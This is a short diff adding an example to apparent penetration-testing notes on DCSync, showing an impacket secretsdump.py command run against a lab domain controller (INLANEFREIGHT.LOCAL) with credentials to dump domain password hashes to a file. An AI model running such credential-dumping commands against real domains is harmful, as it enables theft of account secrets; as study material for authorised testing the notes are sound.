@@ -388,6 +388,13 @@ secretsdump.py -outputfile $filename -just-dc $domain/$userSamAccountName@$ipDom
 # This will generate 3 files with dumped secrets
 ```
 
+Another example:
+
+```
+# This will use the preinstalled impacket version of our kali
+secretsdump.py 'INLANEFREIGHT.LOCAL/$username:$password@$ipDC' -outfile  domainuser.txt
+```
+
 
 ### Reversible Encryption Password Storage Set
 
